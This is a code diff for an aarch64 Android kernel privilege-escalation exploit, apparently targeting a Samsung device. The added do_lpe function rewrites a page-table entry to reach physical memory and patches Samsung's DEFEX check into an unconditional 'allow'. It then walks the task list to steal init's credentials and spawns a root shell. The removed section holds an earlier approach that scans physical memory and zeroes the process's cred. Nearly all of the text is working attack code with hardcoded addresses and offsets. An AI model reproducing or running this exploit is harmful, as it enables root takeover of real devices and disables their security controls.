@@ -96,6 +96,7 @@ static void p_hex(uint64_t v, int digits) {
 static void p_hex64(uint64_t v) { p_str("0x"); p_hex(v, 16); }
 static void p_nl(void)          { p_str("\n"); }
 
+__attribute__((unused))
 static void p_dec(uint64_t v, int digits) {
     char buf[20];
     for (int i = digits - 1; i >= 0; i--) {
@@ -164,6 +165,191 @@ static void flush_tlb(void) {
 /* aarch64 PTE: OA in bits[47:12]. Preserve everything else. */
 #define PTE_OA_MASK    0x0000fffffffff000UL
 #define PTE_ATTRS_MASK (~PTE_OA_MASK)
+
+/* ---------- LPE: defang DEFEX, swap our cred for init's ----------
+   Fixed kernel-image PAs (the kernel image is loaded at a constant PA in
+   DRAM; KASLR randomizes virtual addresses, not physical placement):
+     init_task           PA 0x41f4d2c0
+     task_defex_enforce  PA 0x40270330
+   BTF-derived task_struct offsets (KASLR-invariant — struct layout is fixed
+   by the kernel build):
+     tasks      @ +0x550
+     pid        @ +0x618
+     parent     @ +0x630
+     real_cred  @ +0x818
+     cred       @ +0x820
+   Linear-map VA -> PA (where slab-allocated task_structs live):
+     pa = linear_va - LINEAR_OFFSET
+   with LINEAR_OFFSET = PAGE_OFFSET - memstart_addr
+                     = 0xffffff8000000000 - 0x40000000
+                     = 0xffffff7fc0000000
+   Both terms are static: PAGE_OFFSET is a compile-time kernel constant for
+   VA_BITS=40, memstart_addr is the device's DRAM start (hardware-fixed).
+   Kernel-image VA -> PA is KASLR-randomized; we don't need it because every
+   kernel-image symbol we touch (init_task, task_defex_enforce) is reached
+   via a hardcoded PA. We do recover init_task's VA at runtime (from its
+   self-referential .parent pointer) so we can detect the list head when
+   walking task_struct.tasks.
+*/
+#define INIT_TASK_PA          0x41f4d2c0UL
+#define DEFEX_ENFORCE_PA      0x40270330UL
+#define TS_TASKS_OFF          0x550
+#define TS_PID_OFF            0x618
+#define TS_PARENT_OFF         0x630
+#define TS_REAL_CRED_OFF      0x818
+#define TS_CRED_OFF           0x820
+#define LINEAR_OFFSET         0xffffff7fc0000000UL
+#define LINEAR_VA_TO_PA(v)    ((v) - LINEAR_OFFSET)
+
+/* aarch64 "mov w0, wzr ; ret" — i.e., return 0 unconditionally. The
+   original task_defex_enforce starts with paciasp, but it's only ever
+   reached via direct `bl` (no callers store its address as data), so we
+   don't need a BTI landing pad — and since the stub never touches LR, we
+   don't need PAC either. */
+#define INSN_MOV_W0_0         0x52800000U
+#define INSN_RET              0xd65f03c0U
+
+static volatile uint8_t *KMAP;        /* set to glitched_map before any kread/kwrite */
+static uint64_t          KORIG_PTE;   /* attribute bits of glitched_pte */
+
+static void kpoint(uint64_t pa) {
+    *glitched_pte = (KORIG_PTE & PTE_ATTRS_MASK) | (pa & PTE_OA_MASK);
+    flush_tlb();
+}
+
+/* PA-keyed primitives. Callers compute PA themselves: hardcoded for
+   kernel-image symbols (INIT_TASK_PA, DEFEX_ENFORCE_PA), or via
+   LINEAR_VA_TO_PA() for slab-allocated task_struct VAs. */
+static uint64_t kread64_pa(uint64_t pa) {
+    kpoint(pa & ~0xfffUL);
+    return *(volatile uint64_t *)(KMAP + (pa & 0xfff));
+}
+
+static uint32_t kread32_pa(uint64_t pa) {
+    kpoint(pa & ~0xfffUL);
+    return *(volatile uint32_t *)(KMAP + (pa & 0xfff));
+}
+
+static void kwrite64_pa(uint64_t pa, uint64_t v) {
+    kpoint(pa & ~0xfffUL);
+    *(volatile uint64_t *)(KMAP + (pa & 0xfff)) = v;
+    __asm__ volatile("dmb ish" ::: "memory");
+}
+
+static void disable_defex(void) {
+    /* Replace the prologue of task_defex_enforce with `mov w0, wzr ; ret`,
+       so every DEFEX check returns "allow". Without this, exec'ing
+       /system/bin/sh as uid=0 from a non-trusted path is killed by
+       Samsung's DEFEX immutable_root check. */
+    p_str("[*] patching task_defex_enforce -> mov w0, wzr ; ret\n");
+    uint64_t pa      = DEFEX_ENFORCE_PA;
+    uint64_t page_pa = pa & ~0xfffUL;
+    size_t   off     = pa & 0xfff;
+
+    kpoint(page_pa);
+    *(volatile uint32_t *)(KMAP + off + 0) = INSN_MOV_W0_0;
+    *(volatile uint32_t *)(KMAP + off + 4) = INSN_RET;
+    __asm__ volatile("dsb ish" ::: "memory");
+
+    /* publish the new instructions to PoU + invalidate I-cache. user-VA
+       cache ops are by-VA but resolve to PA, so they cover the kernel's
+       own mapping of these bytes. Cortex-A55/A75 D/I cache line = 64 B. */
+    uintptr_t va_start = (uintptr_t)(KMAP + off);
+    uintptr_t va_end   = va_start + 8;
+    uintptr_t line     = va_start & ~63UL;
+    for (uintptr_t a = line; a < va_end; a += 64)
+        __asm__ volatile("dc cvau, %0" :: "r"(a) : "memory");
+    __asm__ volatile("dsb ish" ::: "memory");
+    for (uintptr_t a = line; a < va_end; a += 64)
+        __asm__ volatile("ic ivau, %0" :: "r"(a) : "memory");
+    __asm__ volatile("dsb ish; isb" ::: "memory");
+}
+
+static void do_lpe(uint64_t orig_pte, uint8_t *glitched_map) {
+    KMAP      = glitched_map;
+    KORIG_PTE = orig_pte;
+
+    /* Sanity-check that the hardcoded PA actually lands on init_task. */
+    if (kread32_pa(INIT_TASK_PA + TS_PID_OFF) != 0)
+        die("init_task signature mismatch (pid != 0 at INIT_TASK_PA)");
+
+    disable_defex();
+
+    int my_pid = sys_getpid();
+    p_str("[*] my pid = ");
+    p_hex(my_pid, 8);
+    p_nl();
+
+    /* Recover init_task's (KASLR-randomized) VA from its self-referential
+       .parent pointer. We need this so we can spot the list head while
+       walking — the only kernel-image VA we'll see in the chain. */
+    uint64_t init_task_va = kread64_pa(INIT_TASK_PA + TS_PARENT_OFF);
+    uint64_t head_va      = init_task_va + TS_TASKS_OFF;
+    p_str("[*] init_task_va = ");
+    p_hex64(init_task_va);
+    p_nl();
+
+    uint64_t my_task_pa   = 0;
+    uint64_t init_cred_va = 0;
+
+    p_str("[*] walking task list from init_task...\n");
+    uint64_t cur = kread64_pa(INIT_TASK_PA + TS_TASKS_OFF);
+    int n = 0;
+    while (cur != head_va && n < 4096) {
+        /* Every task_struct after init_task is slab-allocated, so its VA
+           is in the linear map — not the kernel image. */
+        uint64_t task_va = cur - TS_TASKS_OFF;
+        uint64_t task_pa = LINEAR_VA_TO_PA(task_va);
+        uint32_t pid     = kread32_pa(task_pa + TS_PID_OFF);
+
+        p_str("  [");
+        p_hex(n, 4);
+        p_str("] task_va=");
+        p_hex64(task_va);
+        p_str(" pid=");
+        p_hex(pid, 8);
+        p_nl();
+
+        if (pid == 1) {
+            init_cred_va = kread64_pa(task_pa + TS_CRED_OFF);
+            p_str("  [+] pid 1 (init) cred=");
+            p_hex64(init_cred_va);
+            p_nl();
+        }
+        if (pid == (uint32_t)my_pid) {
+            my_task_pa = task_pa;
+            p_str("  [+] our task\n");
+        }
+        if (init_cred_va && my_task_pa) break;
+
+        cur = kread64_pa(task_pa + TS_TASKS_OFF);  /* tasks.next */
+        n++;
+    }
+
+    if (!init_cred_va) die("init's cred not found");
+    if (!my_task_pa)   die("our task_struct not found");
+
+    p_str("[*] swapping cred + real_cred...\n");
+    kwrite64_pa(my_task_pa + TS_REAL_CRED_OFF, init_cred_va);
+    kwrite64_pa(my_task_pa + TS_CRED_OFF,      init_cred_va);
+
+    /* restore the original PTE — the glitched mapping is no longer needed. */
+    *glitched_pte = orig_pte;
+
+    p_str("[+] swapped. ");
+    uint32_t r, e, s;
+    sys_getresuid((uid_t *)&r, (uid_t *)&e, (uid_t *)&s);
+    p_str("ruid="); p_hex(r, 8);
+    p_str(" euid="); p_hex(e, 8);
+    p_str(" suid="); p_hex(s, 8);
+    p_nl();
+
+    p_str("[+] exec'ing /system/bin/sh\n");
+    const char *const argv[] = { "/system/bin/sh", 0 };
+    const char *const envp[] = { 0 };
+    sys_execve("/system/bin/sh", argv, envp);
+    die("execve failed");
+}
 
 void _start(void) {
     p_str("[*] Setting up memfd\n");
@@ -245,99 +431,6 @@ void _start(void) {
     p_hex64((uint64_t)(uintptr_t)glitched_map);
     p_nl();
 
-    /* ----- LPE: layout-agnostic cred patch -----
-       Snapshot our 8 cred id values, scan physmem for that 32-byte block
-       (uid,gid,suid,sgid,euid,egid,fsuid,fsgid). On each candidate, write a
-       sentinel sgid and call getresgid — if our own saved gid changes,
-       we found our cred. Then zero the 32-byte block (uid=gid=...=0). */
-
-    uint32_t ruid, euid_, suid_;
-    uint32_t rgid, egid_, sgid_;
-    sys_getresuid((uid_t *)&ruid, (uid_t *)&euid_, (uid_t *)&suid_);
-    sys_getresgid((gid_t *)&rgid, (gid_t *)&egid_, (gid_t *)&sgid_);
-    uint32_t fsuid_ = (uint32_t)sys_setfsuid((uid_t)-1);
-    uint32_t fsgid_ = (uint32_t)sys_setfsgid((gid_t)-1);
-
-    p_str("[*] my ids: ");
-    p_str("ruid=");   p_hex(ruid,   8);
-    p_str(" rgid=");  p_hex(rgid,   8);
-    p_str(" suid=");  p_hex(suid_,  8);
-    p_str(" sgid=");  p_hex(sgid_,  8);
-    p_str(" euid=");  p_hex(euid_,  8);
-    p_str(" egid=");  p_hex(egid_,  8);
-    p_str(" fsuid="); p_hex(fsuid_, 8);
-    p_str(" fsgid="); p_hex(fsgid_, 8);
-    p_nl();
-
-    /* The 8 expected values are kept as separate scalars so the compiler can
-       hold them in registers — no contiguous 32-byte copy of the needle in
-       our process memory for the sweep to false-positive on. */
-
-    p_str("[*] Scanning physmem for our cred...\n");
-
-    int found = 0;
-    for (uintptr_t paddr = PHYS_MEM_BASE; paddr < PHYS_MEM_END && !found; paddr += 0x1000) {
-        *glitched_pte = (orig_pte & PTE_ATTRS_MASK) | (paddr & PTE_OA_MASK);
-        flush_tlb();
-
-        if ((paddr & 0x3fffff) == 0) { /* every 4 MiB */
-            uint64_t pct = (paddr - PHYS_MEM_BASE) * 100 / (PHYS_MEM_END - PHYS_MEM_BASE);
-            p_str("\r[*] phys=");
-            p_hex64(paddr);
-            p_str(" (");
-            p_dec(pct, 3);
-            p_str("%)");
-        }
-
-        for (size_t off = 0; off + 32 <= 0x1000; off += 4) {
-            volatile uint32_t *p = (volatile uint32_t *)(glitched_map + off);
-            if (p[0] != ruid)   continue;
-            if (p[1] != rgid)   continue;
-            if (p[2] != suid_)  continue;
-            if (p[3] != sgid_)  continue;
-            if (p[4] != euid_)  continue;
-            if (p[5] != egid_)  continue;
-            if (p[6] != fsuid_) continue;
-            if (p[7] != fsgid_) continue;
-
-            /* candidate — write a sentinel sgid, ask the kernel what our
-               saved gid is. if it agrees we just patched our own cred. */
-            p[3] = 0x1337;
-            __asm__ volatile("dmb ish" ::: "memory");
-
-            uint32_t r2, e2, s2;
-            sys_getresgid((gid_t *)&r2, (gid_t *)&e2, (gid_t *)&s2);
-
-            if (s2 == 0x1337) {
-                p_str("\n[+] our cred at PA=");
-                p_hex64(paddr + off);
-                p_nl();
-                /* uid..fsgid all zero */
-                for (int k = 0; k < 8; k++) p[k] = 0;
-                __asm__ volatile("dmb ish" ::: "memory");
-                found = 1;
-                break;
-            } else {
-                /* not us — restore */
-                p[3] = sgid_;
-                __asm__ volatile("dmb ish" ::: "memory");
-            }
-        }
-    }
-
-    *glitched_pte = orig_pte;
-
-    if (!found) {
-        p_str("\n[-] couldn't find our cred\n");
-        sys_exit_group(1);
-        __builtin_unreachable();
-    }
-
-    p_str("[+] uid=0! exec'ing /system/bin/sh\n");
-    const char *const argv[] = { "/system/bin/sh", 0 };
-    const char *const envp[] = { 0 };
-    sys_execve("/system/bin/sh", argv, envp);
-    p_str("[-] execve failed\n");
-    sys_exit_group(1);
+    do_lpe(orig_pte, glitched_map);
     __builtin_unreachable();
 }
